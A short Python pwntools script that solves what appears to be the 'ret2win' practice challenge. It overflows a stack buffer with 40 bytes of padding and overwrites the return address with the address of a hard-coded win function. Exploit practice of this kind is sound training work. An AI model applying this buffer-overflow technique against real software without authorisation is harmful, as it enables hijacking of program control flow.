from pwn import *
p = process('./ret2win')

payload = b'A'*40 + p64(0x0000000000400756)
p.recvuntil(b'> ')
p.send(payload)

p.interactive()
